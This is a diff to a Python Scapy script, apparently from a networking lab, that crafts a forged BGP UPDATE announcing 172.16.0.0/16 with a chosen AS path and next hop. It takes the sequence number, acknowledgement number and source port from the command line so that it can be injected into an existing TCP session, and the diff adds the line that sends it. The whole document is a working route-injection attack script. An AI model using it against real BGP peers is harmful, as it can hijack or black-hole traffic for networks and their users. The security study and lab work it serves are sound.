@@ -10,14 +10,14 @@ load_contrib('bgp')
 
 # Pass seq num, ack num, and source port on cmd line
 
-base= IP(src="192.168.4.1", dst="192.168.20.1", proto=6, ttl=1)
+base= IP(src="192.168.4.1", dst="192.168.4.2", proto=6, ttl=1)
 tcp = TCP(dport=179, sport=int(sys.argv[3]), seq=int(sys.argv[1]), ack=int(sys.argv[2]), flags="PA")
 
 #Type 3 is notification, marker is used for authentication, max hex for no auth(32 fs)
 BGPHeader = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
 
 Origin = BGPPathAttr(type_flags=64, type_code=1, attribute=BGPPAOrigin(0))
-#Path = BGPPathAttr(type_flags=64, type_code=2, attribute=BGPPAAS4BytesPath(segments=[1000, 1050]))
+Path = BGPPathAttr(type_flags=64, type_code=2, attribute=BGPPAAS4BytesPath(segments=['1000', '1050']))
 nextHop = BGPPathAttr(type_flags=64, type_code=4, attribute=BGPPANextHop(next_hop="192.168.4.2"))
 nlriV = BGPNLRI_IPv4(prefix="172.16.0.0/16")
 localPref = BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100))
@@ -26,12 +26,13 @@ localPref = BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(loc
 
 #BGPUpB = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100))], nlri=BGPNLRI_IPv4(prefix='172.16.0.0/16'))
 
-UpdateBGP = BGPUpdate(path_attr=[Origin, nextHop])
+UpdateBGP = BGPUpdate(path_attr=[Origin, nextHop, Path], nlri=BGPNLRI_IPv4(prefix="172.16.0.0/16"))
 
 #pkt=IP(dst=dIP,src=sIP,ttl=1) / TCP(dport=dstPort,sport=srcPort) / BGPHeader / BGPNotif
 #pkt.show2()
 
 packet = base / tcp / BGPHeader / UpdateBGP
-packet.show()
+packet.show2()
+send(packet)
 
 #BGPPALocalPref(local_pref=100), 
